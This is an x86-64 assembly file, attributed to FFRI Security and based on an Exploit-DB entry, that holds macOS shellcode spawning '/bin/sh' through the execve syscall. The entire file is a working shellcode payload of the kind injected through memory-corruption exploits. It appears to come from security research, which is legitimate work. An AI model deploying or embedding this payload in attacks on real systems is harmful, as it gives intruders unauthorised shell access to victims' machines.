; (c) FFRI Security, Inc., 2023 / Author: FFRI Security, Inc.
; based on https://www.exploit-db.com/shellcodes/46397
bits 64
global _main

_main:
    ; execve("//bin/sh", 0, 0)
    xor  rax, rax
    cdq
    push rax
    mov  rdi, 0x68732f6e69622f2f
    push rdi
    push rsp
    pop  rdi
    xor  rsi, rsi
    mov  al, 0x2
    ror  rax, 0x28
    mov  al, 0x3b
    syscall
